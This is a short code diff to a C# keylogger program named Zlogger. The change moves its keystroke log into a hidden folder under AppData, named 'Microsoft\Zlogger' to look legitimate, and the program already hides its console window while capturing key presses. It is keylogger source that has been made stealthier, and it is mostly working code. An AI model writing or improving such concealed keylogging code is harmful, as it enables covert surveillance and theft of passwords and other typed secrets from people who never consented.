@@ -15,11 +15,15 @@ namespace Rodjenihm.Zlogger
     {
         static void Main(string[] args)
         {
+            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            var logName = "log.txt";
+            var logDir = Path.Combine(appData, "Microsoft", "Zlogger");
+            var logPath = Path.Combine(logDir, logName);
+            Directory.CreateDirectory(logDir).Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+
             var handle = Kernel32.GetConsoleWindow();
             User32.ShowWindow(handle, (int)WindowState.SW_HIDE);
-
-            var log = "log.txt";
-            using (var keylogger = new Keylogger(log))
+            using (var keylogger = new Keylogger(logPath))
             {
                 keylogger.KeyDown += (sender, e) =>
                 {
